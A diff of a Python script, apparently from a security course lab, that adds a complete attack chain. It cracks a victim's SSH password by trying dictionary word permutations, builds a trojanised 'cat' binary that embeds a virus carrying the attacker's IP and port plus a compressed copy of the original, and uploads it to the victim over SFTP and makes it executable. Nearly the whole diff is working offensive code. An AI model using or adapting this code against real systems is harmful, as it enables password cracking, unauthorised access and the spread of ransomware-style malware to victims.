@@ -5,6 +5,13 @@ import paramiko
 import itertools
 import tarfile
 
+# In this program:
+# 1. Cracking the victim’s password by launching a dictionary attack
+# 2. Compression virus with Ransomware Propagation
+
+# command: ./crack_attack <Victim IP> <Attacker IP> <Attacker port>
+
+
 def connect_ssh(password):
     global victim_ip, victim_name
     ssh_client = paramiko.SSHClient()
@@ -12,45 +19,90 @@ def connect_ssh(password):
     # try connection
     try:  
         ssh_client.connect(hostname=victim_ip, username=victim_name, password=password)
-        print("success")
-        stdin, stdout, stderr = ssh_client.exec_command("touch /home/csc2023/Desktop/test.txt")
-        # print(stdout.readlines())
+        ssh_client.close()
         return True
     except:
         ssh_client.close()
         return False
+
+    
 def try_password():
+    print(f"try to crack victim password...")
     with open('/home/csc2023/materials/victim.dat', 'r') as dat_file:
     # with open('./test.dat', 'r') as dat_file:
         dictionary = dat_file.read().split('\n')[0:-1]
-        idx_arr = [i for i in range(len(dictionary))]
-        for num_words in range(len(dictionary)):
-            combinations = itertools.permutations(idx_arr, num_words)
+        for num_words in range(1, len(dictionary)+1):
+            print(f"### {num_words}")
+            combinations = itertools.permutations(dictionary, num_words)
             for comb in combinations:
-                s = ''
-                for idx in comb: s += dictionary[idx]
-                print(s)
-                if connect_ssh(s): return
+                s = ''.join(comb)
+                if connect_ssh(s):
+                    print(f'victim password: {s}\n')
+                    return s
+                print(f'bad password {s} length {len(s)}')
 
-def infect_cat():
-    # path = "/home/csc2023/cat"
-    path = "/media/sf_codes/cat_test"
-    origin_size = os.stat(path).st_size
-    with tarfile.open('cat.tar', 'w') as tf:
-        tf.add(path)
-        tf.close()
-    # with open(path, 'a') as cat:
 
-        # add  0xdeadbeaf in the last 4 bytes of the file
-        # cat.seek(0, 2) # to the end of the file
-        # cat.write("deadbeaf")
-        # cat.close()
+def infect_cat(attacker_ip, attacker_port, infected_cat):
+    print('Compress virus...')
+    cat_path = "./cat"
+    catxz_path = "./cat.xz"
+
+    origin_size = os.stat(cat_path).st_size # cat size
+    zip_size = os.stat(catxz_path).st_size  # cat.xz size
+
+    # replace some information in virus file
+    virus = b'' 
+    with open("virus", 'rb+') as virus_file:
+        virus += virus_file.read()
+        virus = virus.replace(b"attacker", str(attacker_ip).encode())
+        virus = virus.replace(b"port", str(attacker_port).encode())
+        virus = virus.replace(b"zipSize", str(zip_size).encode())
+    virus += b'\n' # ensure nothing behind exit
+    
+    # get cat.xz data
+    zip_cat = b''
+    with open(catxz_path, 'rb') as cat:
+        zip_cat += cat.read()
+
+    signature = b'\xde\xad\xbe\xaf'
+    padding = b'\x00'*(origin_size - zip_size - len(virus) - len(signature))
+    
+    content = virus + padding + zip_cat + signature
+    print(f'cat({len(content)}) = virus({len(virus)}) + padding({len(padding)})' + 
+          f' + compress({len(zip_cat)}) + signature({len(signature)})')
+    
+    # write the content with the size of the original cat
+    with open(infected_cat, 'wb') as cat:
+        cat.write(content)
+    print('done\n')
+
+    
+def remote_download(victim_password, loacl_path):
+    print('Sending compression virus to victim...')
+    ssh_client = paramiko.SSHClient()
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    # try connection 
+    ssh_client.connect(hostname=victim_ip, username=victim_name, password=victim_password)
+    sftp = ssh_client.open_sftp()
+	
+    # send file
+    remote_path = '/home/csc2023/cat'
+    sftp.put(loacl_path, remote_path)
+    sftp.close()
+        
+    ssh_client.exec_command('chmod +x cat')
+    ssh_client.close()
+    print('done\n')
+    
 
 # ./crack_attack <Victim IP> <Attacker IP> <Attacker port>
 victim_name = "csc2023"
 victim_ip = sys.argv[1]
 attacker_ip = sys.argv[2]
 attacker_port = (int)(sys.argv[3])
-# try_password()
-# connect_ssh("csc2023")
-infect_cat()
+infected_cat = "./infected_cat"
+
+victim_password = try_password()
+infect_cat(attacker_ip, attacker_port, infected_cat)
+remote_download(victim_password, infected_cat)
